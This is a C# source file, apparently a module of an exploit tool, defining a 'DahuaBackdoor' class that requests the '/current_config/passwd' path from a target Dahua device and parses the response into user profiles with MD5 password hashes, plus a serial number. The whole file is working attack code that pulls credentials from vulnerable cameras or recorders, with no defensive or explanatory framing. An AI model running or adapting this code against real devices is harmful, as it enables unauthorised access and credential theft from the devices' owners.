using System;
using System.Net;

using Kaye.Net;
using Kaye.Models;
using Kaye.Profiles;

namespace Kaye.Exploits
{
    public class DahuaBackdoor : Exploit
    {
        private static String BackdoorPath = "/current_config/passwd";

        public override string GetMessage() { return "bashis backdoor"; }

        public Model Model;
        public Profile[] Profiles;
        public String SerialNum;
        public Int32 Generation;

        public static Boolean TryPerform(IPEndPoint Target, out DahuaBackdoor Output)
        {
            Output = new DahuaBackdoor();
            Output.Model = Model.Dahua;
            HTTPSender Http = new HTTPSender(Target);
            String Response = Http.DownloadString(BackdoorPath);
            if (Response == null || Response.Length == 0) return false;
            String[] Lines = Response.Split(new Char[] { '\r', '\n' });
            if (Lines.Length <= 17) return false;
            if (Lines.Length < 19) Output.Generation = 2; 
            else Output.Generation = Lines[18].IndexOf(":") == -1 ? 2 : 3;

            try
            {
                Output.Profiles = new Profile[Lines.Length - 17];
                for (Int32 i = 16; i < Lines.Length - 1; i++)
                {
                    string[] parts = Lines[i].Split(':');
                    Output.Profiles[i - 16] = new Profile(parts[1], parts[2], HashAlg.ShortMD5);             
                }

                Output.Generation = 2;
                return true;
            }

            catch { }

            try
            {
                Output.SerialNum = Lines[18].Split(':')[1];
                if (Lines.Length <= 23) return false;
                Output.Profiles = new Profile[Lines.Length - 23];
                for (Int32 i = 22; i < Lines.Length - 1; i++)
                {
                    string[] parts = Lines[i].Split(':');
                    Output.Profiles[i - 22] = new Profile(parts[1], parts[2], HashAlg.DahuaMD5);
                }
                return true;
            }

            catch { }

            return false;
        }
    }
}